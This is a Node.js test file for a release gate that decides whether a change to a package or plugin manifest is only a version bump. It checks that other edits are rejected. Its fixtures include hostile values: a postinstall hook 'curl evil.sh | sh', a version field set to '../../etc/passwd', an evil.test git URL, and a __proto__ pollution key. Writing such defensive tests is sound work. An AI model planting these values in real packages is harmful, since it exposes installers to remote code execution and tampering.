// version-only.test.mjs — #228: a lockstep version bump must not read as a rail edit.
//
// The exemption is deliberately narrow. Every test below that asserts `false` is
// guarding the property that actually matters: a fix which merely weakened the
// guard would satisfy "the release passes" while silently unfreezing real code.

import test from 'node:test';
import assert from 'node:assert/strict';

import { isManifestFile, isVersionOnlyChange } from '../lib/version-only.mjs';

const pkg = (over = {}) => JSON.stringify({
  name: '@adlc/build-gate',
  version: '1.5.0',
  main: 'lib/index.mjs',
  dependencies: { '@adlc/core': '^1.5.0', chalk: '^5.0.0' },
  ...over,
});

// ---------------------------------------------------------------- file scoping

test('only manifest basenames are eligible for the exemption', () => {
  assert.equal(isManifestFile('packages/build-gate/package.json'), true);
  assert.equal(isManifestFile('plugins/adlc-codex/.codex-plugin/plugin.json'), true);
  assert.equal(isManifestFile('.claude-plugin/marketplace.json'), true);

  // Source, config, and lockfiles are never exempt.
  assert.equal(isManifestFile('packages/build-gate/lib/tier.mjs'), false);
  assert.equal(isManifestFile('package-lock.json'), false);
  assert.equal(isManifestFile('.adlc/config.json'), false);
  assert.equal(isManifestFile('tsconfig.json'), false);
});

test('a file merely NAMED like a manifest deeper in a path is still matched by basename only', () => {
  assert.equal(isManifestFile('package.json'), true);
  assert.equal(isManifestFile('docs/package.json.md'), false);
  assert.equal(isManifestFile('scripts/not-package.json'), false);
});

// ------------------------------------------------------------------ the happy path

test('a top-level version bump alone is exempt', () => {
  assert.equal(isVersionOnlyChange(pkg(), pkg({ version: '1.5.1' })), true);
});

test('a version bump plus lockstep @adlc/* dependency repins is exempt', () => {
  const after = pkg({
    version: '1.5.1',
    dependencies: { '@adlc/core': '^1.5.1', chalk: '^5.0.0' },
  });
  assert.equal(isVersionOnlyChange(pkg(), after), true);
});

test('marketplace.json metadata.version and plugins[].version are exempt', () => {
  const before = JSON.stringify({
    name: 'adlc',
    metadata: { description: 'd', version: '1.5.0' },
    plugins: [{ name: 'adlc', version: '1.5.0', source: './plugins/adlc-claude-code' }],
  });
  const after = JSON.stringify({
    name: 'adlc',
    metadata: { description: 'd', version: '1.5.1' },
    plugins: [{ name: 'adlc', version: '1.5.1', source: './plugins/adlc-claude-code' }],
  });
  assert.equal(isVersionOnlyChange(before, after), true);
});

test('an identical file is exempt (no differing paths at all)', () => {
  assert.equal(isVersionOnlyChange(pkg(), pkg()), true);
});

// ------------------------------------------------- the properties that must hold

test('a behaviour field changing alongside a version bump is NOT exempt', () => {
  const after = pkg({ version: '1.5.1', main: 'lib/evil.mjs' });
  assert.equal(isVersionOnlyChange(pkg(), after), false);
});

test('adding a dependency alongside a version bump is NOT exempt', () => {
  const after = pkg({
    version: '1.5.1',
    dependencies: { '@adlc/core': '^1.5.1', chalk: '^5.0.0', 'evil-pkg': '^1.0.0' },
  });
  assert.equal(isVersionOnlyChange(pkg(), after), false);
});

test('removing a field alongside a version bump is NOT exempt', () => {
  const before = pkg();
  const after = JSON.stringify({
    name: '@adlc/build-gate',
    version: '1.5.1',
    dependencies: { '@adlc/core': '^1.5.1', chalk: '^5.0.0' },
  }); // `main` dropped
  assert.equal(isVersionOnlyChange(before, after), false);
});

test('repinning a NON-@adlc dependency is NOT exempt', () => {
  const after = pkg({
    version: '1.5.1',
    dependencies: { '@adlc/core': '^1.5.1', chalk: '^9.9.9' },
  });
  assert.equal(isVersionOnlyChange(pkg(), after), false);
});

test('adding a scripts block is NOT exempt (arbitrary code execution)', () => {
  const after = pkg({ version: '1.5.1', scripts: { postinstall: 'curl evil.sh | sh' } });
  assert.equal(isVersionOnlyChange(pkg(), after), false);
});

test('changing a plugins[] entry other than its version is NOT exempt', () => {
  const before = JSON.stringify({
    plugins: [{ name: 'adlc', version: '1.5.0', source: './plugins/adlc-claude-code' }],
  });
  const after = JSON.stringify({
    plugins: [{ name: 'adlc', version: '1.5.1', source: './plugins/evil' }],
  });
  assert.equal(isVersionOnlyChange(before, after), false);
});

test('appending a new plugins[] entry is NOT exempt', () => {
  const before = JSON.stringify({ plugins: [{ name: 'adlc', version: '1.5.0' }] });
  const after = JSON.stringify({
    plugins: [{ name: 'adlc', version: '1.5.1' }, { name: 'evil', version: '1.5.1' }],
  });
  assert.equal(isVersionOnlyChange(before, after), false);
});

test('reordering plugins[] is NOT exempt', () => {
  const before = JSON.stringify({
    plugins: [{ name: 'a', version: '1.5.0' }, { name: 'b', version: '1.5.0' }],
  });
  const after = JSON.stringify({
    plugins: [{ name: 'b', version: '1.5.0' }, { name: 'a', version: '1.5.0' }],
  });
  assert.equal(isVersionOnlyChange(before, after), false);
});

// ------------------------------------------------------------ value-shape guards

test('a non-semver value smuggled into `version` is NOT exempt', () => {
  assert.equal(isVersionOnlyChange(pkg(), pkg({ version: '../../etc/passwd' })), false);
  assert.equal(isVersionOnlyChange(pkg(), pkg({ version: '' })), false);
});

test('changing `version` to a non-string is NOT exempt', () => {
  assert.equal(isVersionOnlyChange(pkg(), pkg({ version: 1.51 })), false);
  assert.equal(isVersionOnlyChange(pkg(), pkg({ version: null })), false);
  assert.equal(isVersionOnlyChange(pkg(), pkg({ version: { $gt: '' } })), false);
});

test('an @adlc/* range rewritten to a non-range is NOT exempt', () => {
  const after = pkg({
    version: '1.5.1',
    dependencies: { '@adlc/core': 'file:../evil', chalk: '^5.0.0' },
  });
  assert.equal(isVersionOnlyChange(pkg(), after), false);
});

test('an @adlc/* range rewritten to a git URL is NOT exempt', () => {
  const after = pkg({
    version: '1.5.1',
    dependencies: { '@adlc/core': 'git+ssh://git@evil.test/x.git', chalk: '^5.0.0' },
  });
  assert.equal(isVersionOnlyChange(pkg(), after), false);
});

// -------------------------------------------------------------------- fail closed

test('unparseable JSON on either side is NOT exempt', () => {
  assert.equal(isVersionOnlyChange('{not json', pkg({ version: '1.5.1' })), false);
  assert.equal(isVersionOnlyChange(pkg(), '{not json'), false);
  assert.equal(isVersionOnlyChange('{not json', '{also not json'), false);
});

test('a missing side (added or deleted file) is NOT exempt', () => {
  assert.equal(isVersionOnlyChange(null, pkg()), false);
  assert.equal(isVersionOnlyChange(pkg(), null), false);
  assert.equal(isVersionOnlyChange(undefined, undefined), false);
});

test('a non-object JSON document is NOT exempt', () => {
  assert.equal(isVersionOnlyChange('[]', '[]'), false);
  assert.equal(isVersionOnlyChange('"str"', '"str2"'), false);
  assert.equal(isVersionOnlyChange('null', 'null'), false);
});

test('a prototype-pollution key is NOT exempt', () => {
  const before = '{"version":"1.5.0"}';
  const after = '{"version":"1.5.1","__proto__":{"polluted":true}}';
  assert.equal(isVersionOnlyChange(before, after), false);
  assert.equal({}.polluted, undefined);
});
